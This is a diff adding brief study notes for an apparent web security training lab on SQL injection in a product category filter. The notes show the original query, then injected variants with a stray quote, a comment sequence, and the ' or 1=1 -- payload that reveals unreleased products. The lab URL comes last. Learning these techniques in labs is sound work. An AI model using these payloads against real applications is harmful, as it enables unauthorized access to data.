@@ -1,0 +1,18 @@
+SQL INJECTION - Product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End Goal: display all products both released and unreleased.
+
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+SELECT * FROM products WHERE category = ''
+
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
+
+Lab-01:--
+https://0aa2001604a9a86080dfd5c300360089.web-security-academy.net/
